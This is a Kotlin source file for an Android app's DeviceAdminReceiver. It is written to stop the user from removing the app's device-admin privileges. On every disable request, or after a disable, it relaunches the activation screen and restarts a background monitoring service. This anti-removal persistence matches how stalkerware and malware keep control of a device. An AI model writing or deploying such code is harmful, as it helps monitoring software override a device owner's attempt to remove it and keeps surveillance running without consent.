package com.bfoxnet.dashboard.admin

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast
import com.bfoxnet.dashboard.R
import com.bfoxnet.dashboard.services.MonitorService

/**
 * DeviceAdminReceiver that prevents the user from removing Device Admin privileges.
 *
 * When the system calls [onDisableRequested] or [onDisabled], the receiver
 * immediately re-launches the Device Admin activation screen so the user cannot
 * complete the removal.  The foreground MonitorService is also (re-)started to
 * ensure background monitoring continues even during the attempt.
 */
class DeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        Toast.makeText(context, context.getString(R.string.admin_enabled), Toast.LENGTH_SHORT).show()
    }

    /** Called just before Device Admin is about to be disabled by the user. */
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // Re-activate device admin immediately to block removal
        reActivateAdmin(context)
        return context.getString(R.string.admin_disable_blocked)
    }

    /** Called after Device Admin has been disabled (e.g. via adb).  Re-enrol. */
    override fun onDisabled(context: Context, intent: Intent) {
        reActivateAdmin(context)
    }

    // -----------------------------------------------------------------------

    private fun reActivateAdmin(context: Context) {
        val activateIntent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                android.content.ComponentName(context, DeviceAdminReceiver::class.java)
            )
            putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                context.getString(R.string.admin_activation_reason)
            )
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(activateIntent)

        // Also ensure the background service is still running
        MonitorService.start(context)
    }
}
